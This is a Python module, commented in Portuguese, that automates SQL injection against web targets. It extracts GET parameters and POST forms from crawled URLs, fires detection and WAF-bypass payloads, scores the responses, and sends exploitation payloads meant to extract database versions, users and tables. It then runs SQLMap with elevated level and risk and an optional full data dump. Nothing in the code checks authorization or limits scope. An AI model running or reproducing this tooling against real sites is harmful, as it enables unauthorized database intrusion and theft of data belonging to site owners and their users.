# modules/sql_injection.py
import time
import subprocess
import json
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin
from typing import List, Dict, Optional, Set, Tuple
import re

import requests
from bs4 import BeautifulSoup

from config import (
    SQLI_PAYLOADS, SQLI_EXPLOIT_PAYLOADS, REQUEST_TIMEOUT, WAF_BYPASS_PAYLOADS
)
from utils import logger

# ========== 1. Extração de parâmetros (GET e POST) ==========
def extrair_parametros_get(url: str) -> Dict[str, List[str]]:
    """Extrai parâmetros GET mantendo múltiplos valores."""
    parsed = urlparse(url)
    return parse_qs(parsed.query, keep_blank_values=True)

def extrair_parametros_post(url: str, session: requests.Session, profundidade: int = 1) -> List[Dict]:
    """
    Busca recursivamente por formulários POST nas páginas.
    """
    forms = []
    try:
        resp = session.get(url, timeout=REQUEST_TIMEOUT)
        if resp.status_code != 200:
            return forms
        soup = BeautifulSoup(resp.text, 'html.parser')
        for form in soup.find_all('form'):
            method = form.get('method', 'get').upper()
            if method != 'POST':
                continue
            action = form.get('action', '')
            target_url = urljoin(url, action)
            inputs = {}
            for inp in form.find_all('input'):
                name = inp.get('name')
                if name:
                    inputs[name] = [inp.get('value', '')]
            if inputs:
                forms.append({
                    'url': target_url,
                    'method': 'POST',
                    'params': inputs
                })
    except Exception as e:
        logger.debug(f"Erro ao extrair forms de {url}: {e}")
    return forms

# ========== 2. Baseline e indicadores ==========
class Baseline:
    def __init__(self, url: str, method: str, params: dict, session: requests.Session):
        self.url = url
        self.method = method
        self.params = params
        self.start_time = time.time()
        try:
            if method.upper() == 'GET':
                self.resp = session.get(url, params=params, timeout=10)
            else:
                self.resp = session.post(url, data=params, timeout=10)
            self.elapsed = time.time() - self.start_time
            self.status = self.resp.status_code
            self.size = len(self.resp.text)
            self.content_hash = hashlib.md5(self.resp.text.encode()).hexdigest()
            self.headers = dict(self.resp.headers)
            self.text = self.resp.text  # para comparação detalhada
        except Exception as e:
            logger.error(f"Erro ao obter baseline: {e}")
            raise

def comparar_resposta(baseline: Baseline, resp: requests.Response, elapsed: float) -> Dict[str, float]:
    """
    Retorna um dicionário com métricas de diferença normalizadas.
    """
    diff = {}
    diff['status_diff'] = 0 if resp.status_code == baseline.status else 1.0
    size_ratio = abs(len(resp.text) - baseline.size) / max(baseline.size, 1)
    diff['size_ratio'] = min(size_ratio, 1.0)
    time_ratio = abs(elapsed - baseline.elapsed) / max(baseline.elapsed, 0.1)
    diff['time_ratio'] = min(time_ratio, 1.0)
    # Diferença de conteúdo (simples: proporção de palavras diferentes)
    words_orig = set(baseline.text.split())
    words_new = set(resp.text.split())
    if words_orig:
        diff['content_diff'] = 1 - len(words_orig & words_new) / len(words_orig)
    else:
        diff['content_diff'] = 0 if resp.text == baseline.text else 0.5
    # Detecção de erro SQL por regex (mais abrangente)
    error_patterns = [
        r'sql', r'mysql', r'ora-', r'syntax error', r'unclosed quotation',
        r'microsoft ole db', r'postgresql', r'warning: mysql', r'pg_',
        r'invalid query', r'unexpected token', r'quoted string not properly terminated'
    ]
    text_lower = resp.text.lower()
    diff['error_score'] = 1.0 if any(re.search(p, text_lower) for p in error_patterns) else 0.0
    return diff

def calcular_score(diff: Dict[str, float]) -> int:
    """
    Calcula um score de 0 a 100.
    Pesos: erro (40%), tamanho (25%), conteúdo (20%), tempo (10%), status (5%).
    """
    weights = {
        'error_score': 40,
        'size_ratio': 25,
        'content_diff': 20,
        'time_ratio': 10,
        'status_diff': 5
    }
    score = sum(diff.get(k, 0) * weights[k] for k in weights)
    return int(score)

# ========== 3. Teste com payloads de detecção ==========
def testar_payloads_deteccao(baseline: Baseline, session: requests.Session, payloads: List[str]) -> List[Dict]:
    """
    Testa cada payload em cada parâmetro e retorna lista de alertas com score.
    """
    alertas = []
    for param, values in baseline.params.items():
        for idx, original_value in enumerate(values):
            for payload in payloads:
                params_teste = baseline.params.copy()
                params_teste[param] = [payload]
                try:
                    start = time.time()
                    if baseline.method.upper() == 'GET':
                        resp = session.get(baseline.url, params=params_teste, timeout=15)
                    else:
                        resp = session.post(baseline.url, data=params_teste, timeout=15)
                    elapsed = time.time() - start
                    diff = comparar_resposta(baseline, resp, elapsed)
                    score = calcular_score(diff)
                    if score >= 30:  # limiar mínimo
                        alertas.append({
                            'parametro': param,
                            'payload': payload,
                            'score': score,
                            'diff': diff,
                            'status_code': resp.status_code,
                            'size': len(resp.text),
                            'elapsed': elapsed
                        })
                except Exception as e:
                    logger.debug(f"Erro no teste: {e}")
    return alertas

# ========== 4. Exploração com payloads ofensivos ==========
def explorar_com_payloads_avancados(baseline: Baseline, session: requests.Session, dbms: str) -> List[Dict]:
    """
    Usa payloads de exploração (SQLI_EXPLOIT_PAYLOADS) para tentar extrair dados.
    Retorna resultados (ex: versão, usuário, tabelas).
    """
    resultados = []
    if dbms not in SQLI_EXPLOIT_PAYLOADS:
        dbms = 'generic'
    payloads = SQLI_EXPLOIT_PAYLOADS[dbms]

    for param, values in baseline.params.items():
        for idx, original_value in enumerate(values):
            for payload in payloads:
                params_teste = baseline.params.copy()
                params_teste[param] = [payload]
                try:
                    if baseline.method.upper() == 'GET':
                        resp = session.get(baseline.url, params=params_teste, timeout=15)
                    else:
                        resp = session.post(baseline.url, data=params_teste, timeout=15)
                    # Verifica se a resposta contém dados interessantes
                    if len(resp.text) > 100 and 'error' not in resp.text.lower():
                        # Possível extração de dados
                        resultados.append({
                            'parametro': param,
                            'payload': payload,
                            'resumo': resp.text[:200],
                            'tamanho': len(resp.text)
                        })
                except Exception as e:
                    logger.debug(f"Erro na exploração: {e}")
    return resultados

# ========== 5. Bypass de WAF ==========
def testar_bypass_waf(baseline: Baseline, session: requests.Session) -> List[Dict]:
    """
    Tenta payloads de bypass de WAF para ver se conseguem contornar bloqueios.
    """
    alertas = []
    for param, values in baseline.params.items():
        for payload in WAF_BYPASS_PAYLOADS:
            params_teste = baseline.params.copy()
            params_teste[param] = [payload]
            try:
                start = time.time()
                if baseline.method.upper() == 'GET':
                    resp = session.get(baseline.url, params=params_teste, timeout=15)
                else:
                    resp = session.post(baseline.url, data=params_teste, timeout=15)
                elapsed = time.time() - start
                diff = comparar_resposta(baseline, resp, elapsed)
                score = calcular_score(diff)
                if score >= 50:  # bypass bem-sucedido
                    alertas.append({
                        'parametro': param,
                        'payload': payload,
                        'score': score
                    })
            except Exception as e:
                logger.debug(f"Erro no bypass: {e}")
    return alertas

# ========== 6. Integração com SQLMap ==========
def executar_sqlmap_completo(url: str, method='GET', data=None, cookie=None,
                              nivel=3, risco=2, tecnica='BEUSTQ', dbms=None,
                              dump=False, sqlmap_path='sqlmap') -> Dict:
    """
    Executa SQLMap e retorna resultado estruturado.
    """
    import tempfile
    import os
    with tempfile.TemporaryDirectory() as tmpdir:
        comando = [
            sqlmap_path,
            "-u", url,
            f"--level={nivel}",
            f"--risk={risco}",
            f"--technique={tecnica}",
            "--batch",
            f"--output-dir={tmpdir}",
            "--flush-session"
        ]
        if method.upper() == 'POST' and data:
            comando.extend(["--data", data])
        if cookie:
            comando.extend(["--cookie", cookie])
        if dbms:
            comando.extend(["--dbms", dbms])
        if dump:
            comando.extend(["--dump", "--threads=5"])

        try:
            resultado = subprocess.run(comando, capture_output=True, text=True, timeout=600)
            # Procura por arquivos de log JSON (SQLMap gera vários)
            log_file = None
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.log') or file.endswith('.json'):
                        log_file = os.path.join(root, file)
                        break
            if log_file:
                with open(log_file, 'r') as f:
                    log_data = f.read()
                try:
                    data = json.loads(log_data)
                    return {'url': url, 'vulneravel': True, 'detalhes': data}
                except:
                    pass
            # Fallback: procura por "vulnerable" na stdout
            vulneravel = "vulnerable" in resultado.stdout.lower()
            return {'url': url, 'vulneravel': vulneravel, 'detalhes': resultado.stdout[:1000]}
        except subprocess.TimeoutExpired:
            logger.warning(f"SQLMap timeout para {url}")
            return {'url': url, 'erro': 'timeout'}
        except Exception as e:
            logger.error(f"Erro SQLMap: {e}")
            return {'url': url, 'erro': str(e)}

# ========== 7. Função principal do módulo (com o nome esperado) ==========
def modulo_sql_injection(dominio: str, session: requests.Session, urls_coletadas: List[str],
                         cookies: dict = None, sqlmap_path='sqlmap', sql_technique='BEUSTQ',
                         sql_dbms=None, sql_dump=False) -> Dict:
    """
    Orquestra todo o processo de detecção e exploração de SQLi.
    Retorna dicionário com 'criticos' (confirmações) e 'suspeitos' (alertas).
    """
    resultados = {
        'criticos': [],
        'suspeitos': [],
        'exploracao': [],
        'bypass': []
    }

    # 1. Gerar lista de alvos (GET e POST) - sem limites
    alvos = []
    for url in urls_coletadas:
        params_get = extrair_parametros_get(url)
        if params_get:
            alvos.append({
                'url': url.split('?')[0],
                'method': 'GET',
                'params': params_get
            })
        # Extrair formulários POST de todas as URLs
        forms = extrair_parametros_post(url, session)
        alvos.extend(forms)

    logger.info(f"Total de alvos para SQL Injection: {len(alvos)}")

    # 2. Para cada alvo, obter baseline e testar payloads
    # Usaremos payloads de detecção + bypass
    payloads_deteccao = []
    for tech in SQLI_PAYLOADS.values():
        for db_payloads in tech.values():
            payloads_deteccao.extend(db_payloads)

    # Adiciona payloads de bypass também
    payloads_deteccao.extend(WAF_BYPASS_PAYLOADS)

    for alvo in alvos:
        try:
            logger.info(f"Testando {alvo['url']} ({alvo['method']})")
            baseline = Baseline(alvo['url'], alvo['method'], alvo['params'], session)
            alertas = testar_payloads_deteccao(baseline, session, payloads_deteccao)

            for a in alertas:
                if a['score'] >= 70:
                    resultados['criticos'].append(a)
                elif a['score'] >= 30:
                    resultados['suspeitos'].append(a)

            # Se houver alertas, tenta bypass e exploração
            if alertas:
                # Testa bypass mais agressivo
                bypass = testar_bypass_waf(baseline, session)
                resultados['bypass'].extend(bypass)

                # Se o banco foi especificado ou detectado, tenta exploração
                db = sql_dbms if sql_dbms else 'generic'
                exploracao = explorar_com_payloads_avancados(baseline, session, db)
                resultados['exploracao'].extend(exploracao)

                # Executa SQLMap para confirmação (sempre que houver alertas)
                logger.info(f"Executando SQLMap em {alvo['url']}")
                cookie_str = '; '.join([f"{k}={v}" for k, v in (cookies or {}).items()])
                if alvo['method'] == 'POST':
                    data_str = '&'.join([f"{k}={v[0]}" for k, v in alvo['params'].items()])
                    analise = executar_sqlmap_completo(
                        alvo['url'], method='POST', data=data_str,
                        cookie=cookie_str, tecnica=sql_technique, dbms=sql_dbms,
                        dump=sql_dump, sqlmap_path=sqlmap_path
                    )
                else:
                    full_url = alvo['url'] + '?' + '&'.join([f"{k}={v[0]}" for k, v in alvo['params'].items()])
                    analise = executar_sqlmap_completo(
                        full_url, method='GET',
                        cookie=cookie_str, tecnica=sql_technique, dbms=sql_dbms,
                        dump=sql_dump, sqlmap_path=sqlmap_path
                    )
                if analise.get('vulneravel'):
                    resultados['criticos'].append({'sqlmap': analise})
        except Exception as e:
            logger.error(f"Erro ao processar alvo {alvo['url']}: {e}")

    logger.info(f"SQL Injection: {len(resultados['criticos'])} críticos, {len(resultados['suspeitos'])} suspeitos")
    return resultados